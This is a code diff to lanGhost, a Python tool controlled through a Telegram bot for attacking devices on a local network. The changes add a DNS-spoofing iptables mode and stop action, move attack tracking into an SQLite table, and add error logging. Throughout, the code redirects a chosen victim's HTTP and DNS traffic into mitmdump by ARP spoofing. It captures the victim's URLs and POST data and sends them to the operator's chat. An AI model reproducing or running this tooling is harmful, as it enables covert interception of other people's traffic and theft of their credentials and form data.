@@ -87,14 +87,25 @@ def iptables(action, target=False):
         os.system("sudo iptables -D FORWARD -s " + target + " -j DROP")
 
     if action == "mitm":
-        print("[+] Routing " + target + " into mitmdump with iptables")
+        print("[+] Routing " + target + " into mitmdump with iptables...")
         os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
         os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
         os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")
 
+    if action == "spoofdns":
+        print("[+] Spoofing dns for  " + target + " with iptables...")
+        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
+        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")
+
     if action == "stopmitm":
-        print("[+] Stopping iptables mitm for " + target)
+        print("[+] Stopping iptables mitm for " + target + "...")
         os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+        os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
+        os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")
+
+
+    if action == "stopspoofdns":
+        print("[+] Stopping iptables spoofdns for " + target + "...")
         os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
         os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")
 
@@ -217,7 +228,7 @@ def mitmHandler(target, ID, bot):
             try:
                 DBconn = sqlite3.connect(script_path + "lanGhost.db")
                 DBcursor = DBconn.cursor()
-                DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_mitm (id integer primary key autoincrement, source TEXT,host TEXT, url TEXT, method TEXT, data TEXT, dns TEXT)")
+                DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_mitm (id integer primary key autoincrement, source TEXT, host TEXT, url TEXT, method TEXT, data TEXT, dns TEXT)")
                 DBconn.commit()
                 DBcursor.execute("SELECT * FROM lanGhost_mitm")
                 data = DBcursor.fetchall()
@@ -236,68 +247,92 @@ def mitmHandler(target, ID, bot):
                             textline += str(item[4]) + " ➖ " + str(item[3]) + "\n📄 POST DATA:\n" + urllib.parse.unquote(item[5]) + "\n\n"
                         else:
                             textline += str(item[4]) + " ➖ " + str(item[3]) + "\n\n"
-                    DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=" + str(item[0]))
+                    DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=?", [str(item[0])])
                     DBconn.commit()
                 if not textline == "📱 MITM - " + target[0] + "\n\n":
                     bot.send_message(chat_id=admin_chatid, text=textline)
                 DBconn.close()
                 time.sleep(1)
             except:
-                print("[!!!] mitmHandler crashed...")
+                print("[!!!] " + str(traceback.format_exc()))
         else:
             break
 
 
 def attackManager(action, attack_type=False, target=False, ID=False):
     global running_attacks
-    # Layout: [[ID, attack_type, target, thread]]
+    # Layout: [[ID, attack_type, target]]
+
+    DBconn = sqlite3.connect(script_path + "lanGhost.db")
+    DBcursor = DBconn.cursor()
+    DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_attacks (id integer primary key autoincrement, attackid TEXT, attack_type TEXT, target TEXT)")
+    DBconn.commit()
+    DBconn.close()
+
+    DBconn = sqlite3.connect(script_path + "lanGhost.db")
+    DBcursor = DBconn.cursor()
 
     def getNewID():
-        if running_attacks == []:
+        DBcursor.execute("SELECT attackid FROM lanGhost_attacks ORDER BY id DESC LIMIT 1")
+        data = DBcursor.fetchone()
+        if data == None:
             return 1
-        else:
-            latest_attack = running_attacks[-1]
-            return latest_attack[0] + 1
+        data = data[0]
+        return int(data) + 1
 
     if action == "new":
         ID = getNewID()
-        running_attacks.append([ID, attack_type, target])
+        DBcursor.execute("INSERT INTO lanGhost_attacks(attackid, attack_type, target) VALUES (?, ?, ?)", [str(ID), attack_type, target])
+        DBconn.commit()
         return ID
 
     elif action == "del":
-        removed = False
-        for attack in running_attacks:
-            if attack[0] == int(ID):
-                removed = True
-                running_attacks.remove(attack)
-        return removed
+        DBcursor.execute("DELETE FROM lanGhost_attacks WHERE attackid=?", [str(ID)])
+        DBconn.commit()
+        if DBcursor.rowcount == 1:
+            return True
+        else:
+            return False
 
     elif action == "isrunning":
-        for attack in running_attacks:
-            if attack[0] == int(ID):
-                return True
-        return False
+        DBcursor.execute("SELECT attackid FROM lanGhost_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
+        data = DBcursor.fetchone()
+        if data == None:
+            return False
+        else:
+            return True
 
     elif action == "isattacked":
-        for attack in running_attacks:
-            if attack[2] == target:
-                return True
-        return False
+        DBcursor.execute("SELECT attackid FROM lanGhost_attacks WHERE target=? ORDER BY id DESC LIMIT 1", [target])
+        data = DBcursor.fetchone()
+        if data == None:
+            return False
+        else:
+            return True
 
     elif action == "gettype":
-        for attack in running_attacks:
-            if attack[0] == int(ID):
-                return attack[1]
-        return False
+        DBcursor.execute("SELECT attack_type FROM lanGhost_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
+        data = DBcursor.fetchone()
+        if data == None:
+            return False
+        else:
+            return data[0]
 
     elif action == "gettarget":
-        for attack in running_attacks:
-            if attack[0] == int(ID):
-                return attack[2]
-        return False
+        DBcursor.execute("SELECT target FROM lanGhost_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
+        data = DBcursor.fetchone()
+        if data == None:
+            return False
+        else:
+            return data[0]
 
     elif action == "list":
-        return running_attacks
+        DBcursor.execute("SELECT attackid, attack_type, target FROM lanGhost_attacks")
+        data = DBcursor.fetchall()
+        if data == None:
+            return []
+        else:
+            return data
 
 
 # Command handlers:
@@ -417,7 +452,7 @@ def msg_stop(bot, update, args):
             DBconn.close()
 
         elif atype == "spoofdns":
-            iptables("stopmitm", target=target)
+            iptables("stopspoofdns", target=target)
 
             DBconn = sqlite3.connect(script_path + "lanGhost.db")
             DBcursor = DBconn.cursor()
@@ -440,55 +475,60 @@ def msg_attacks(bot, update, args):
     if not str(update.message.chat_id) == str(admin_chatid):
         return
 
-    attacks = attackManager("list")
+    try:
+        attacks = attackManager("list")
 
-    if attacks == []:
-            bot.send_message(chat_id=update.message.chat_id, text="✅ There are no attacks currently running...")
-            return
+        if attacks == []:
+                bot.send_message(chat_id=update.message.chat_id, text="✅ There are no attacks currently running...")
+                return
 
-    textline = ""
-    for attack in attacks:
-        textline += "ID: " + str(attack[0]) + " ➖ " + attack[1] + " ➖ " + attack[2] + "\n"
-    bot.send_message(chat_id=update.message.chat_id, text="🔥 Attacks running:\n\n" + textline)
+        textline = ""
+        for attack in attacks:
+            textline += "ID: " + str(attack[0]) + " ➖ " + attack[1] + " ➖ " + attack[2] + "\n"
+        bot.send_message(chat_id=update.message.chat_id, text="🔥 Attacks running:\n\n" + textline)
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
 
 def msg_mitm(bot, update, args):
     global admin_chatid
     if not str(update.message.chat_id) == str(admin_chatid):
         return
+    try:
+        if args == []:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /mitm [TARGET-IP]")
+            return
 
-    if args == []:
-        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /mitm [TARGET-IP]")
-        return
+        target_ip = args[0]
 
-    target_ip = args[0]
+        global latest_scan
+        hosts = latest_scan[:]
+        target_mac = False
+        for host in hosts:
+            if host[0] == target_ip:
+                target_mac = host[1]
+        if not target_mac:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
+            return
 
-    global latest_scan
-    hosts = latest_scan[:]
-    target_mac = False
-    for host in hosts:
-        if host[0] == target_ip:
-            target_mac = host[1]
-    if not target_mac:
-        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
-        return
+        target = [target_ip, target_mac]
+        iptables("mitm", target=target[0])
+        if not attackManager("isattacked", target=target_ip):
+            ID = attackManager("new", attack_type="mitm", target=target_ip)
+            arp_thread = threading.Thread(target=arpSpoof, args=[target])
+            arp_thread.daemon = True
+            arp_thread.start()
+        else:
+            ID = attackManager("new", attack_type="mitm", target=target_ip)
 
-    target = [target_ip, target_mac]
-    iptables("mitm", target=target[0])
-    if not attackManager("isattacked", target=target_ip):
-        ID = attackManager("new", attack_type="mitm", target=target_ip)
-        arp_thread = threading.Thread(target=arpSpoof, args=[target])
-        arp_thread.daemon = True
-        arp_thread.start()
-    else:
-        ID = attackManager("new", attack_type="mitm", target=target_ip)
+        mitm_thread = threading.Thread(target=mitmHandler, args=[target, ID, bot])
+        mitm_thread.daemon = True
+        mitm_thread.start()
 
-    mitm_thread = threading.Thread(target=mitmHandler, args=[target, ID, bot])
-    mitm_thread.daemon = True
-    mitm_thread.start()
-
-    bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
-    bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
-    bot.send_message(chat_id=update.message.chat_id, text="🔥 Capturing URL's and DNS from " + target_ip + "...")
+        bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
+        bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
+        bot.send_message(chat_id=update.message.chat_id, text="🔥 Capturing URL's and DNS from " + target_ip + "...")
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
 
 
 def msg_img(bot, update):
@@ -614,7 +654,7 @@ def msg_spoofdns(bot, update, args):
         DBconn.commit()
         DBconn.close()
 
-        iptables("mitm", target=target[0])
+        iptables("spoofdns", target=target[0])
         if not attackManager("isattacked", target=target_ip):
             ID = attackManager("new", attack_type="spoofdns", target=target[0])
             arp_thread = threading.Thread(target=arpSpoof, args=[target])
